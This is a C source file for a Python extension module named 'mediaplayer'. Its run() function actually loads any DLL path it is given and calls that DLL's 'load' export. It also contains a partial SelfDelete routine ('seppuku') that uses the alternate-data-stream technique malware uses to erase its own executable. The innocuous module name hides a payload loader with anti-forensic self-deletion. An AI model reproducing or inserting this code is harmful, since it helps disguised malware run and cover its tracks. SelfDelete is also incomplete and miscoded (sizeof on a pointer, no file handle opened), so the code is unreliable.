#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <Windows.h>
#include <stdbool.h>
#include <stdio.h>

typedef bool (*InitFunc)(void);

#define NEW_STREAM L"seppuku";

int SelfDelete(void) {
  HANDLE hFile = INVALID_HANDLE_VALUE;
  
  const wchar_t* NEWSTREAM = (const wchar_t*)NEW_STREAM;
  size_t renameSize = sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);

  PFILE_RENAME_INFO PFRI = NULL;
  WCHAR pathSize[MAX_PATH * 2] = { 0 };
  FILE_DISPOSITION_INFO setDelete = { 0 };
  
  PFRI = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, renameSize);
  if (PFRI == NULL) {
    return EXIT_FAILURE;
  }

  printf("Mem allocated [%p]\n", PFRI);

  ZeroMemory(pathSize, sizeof(pathSize));
  ZeroMemory(&setDelete, sizeof(FILE_DISPOSITION_INFO));
  printf("Mem zeroed\n");

  setDelete.DeleteFile = TRUE;
  printf("DeleteFile set\n");

  PFRI->FileNameLength = sizeof(NEWSTREAM);
  RtlCopyMemory(PFRI->FileName, NEWSTREAM, sizeof(NEWSTREAM));
  printf("FileName copied\n");

  if (GetModuleFileNameW(NULL, pathSize, MAX_PATH) == 0) {
    printf("GetModuleFileNameW failed: %d\n", GetLastError());
    return EXIT_FAILURE;
  }

  printf("Module path: %ls\n", pathSize);
  return EXIT_SUCCESS;
}

static PyObject* _run(PyObject* self, PyObject* args) {
  wchar_t dllPath[MAX_PATH] = { 0 };
  char* dllPath_;

  // Parse arguments passed from Python
  if (!PyArg_ParseTuple(args, "s", &dllPath_)) {
    return Py_None;
  }

  // Convert the DLL path to a wide string (char* -> wchar_t)
  mbstowcs(dllPath, dllPath_, MAX_PATH);

  // Load the DLL
  HMODULE hDll = LoadLibraryW(dllPath);
  if (hDll == NULL) {
    printf("LoadLibraryW failed: %d\n", GetLastError());
    return Py_None;
  }

  // Get the address of the DLL's init function
  InitFunc initFunction = (InitFunc)GetProcAddress(hDll, "load");
  if (initFunction == NULL) {
    printf("GetProcAddress failed: %d\n", GetLastError());
    return Py_None;
  }

  // Start the DLL
  bool delete = initFunction();

  // Clean up
  if (!FreeLibrary(hDll)) {
    printf("FreeLibrary failed: %d\n", GetLastError());
  }

  return PyBool_FromLong(delete);
}

static struct PyMethodDef methods[] = {
  {"run", (PyCFunction)_run, METH_VARARGS, NULL},
  {NULL, NULL, 0, NULL}
};

static struct PyModuleDef module = {
  PyModuleDef_HEAD_INIT,
  "mediaplayer",
  NULL,
  -1,
  methods
};

PyMODINIT_FUNC PyInit_mediaplayer(void) {
  return PyModule_Create(&module);
}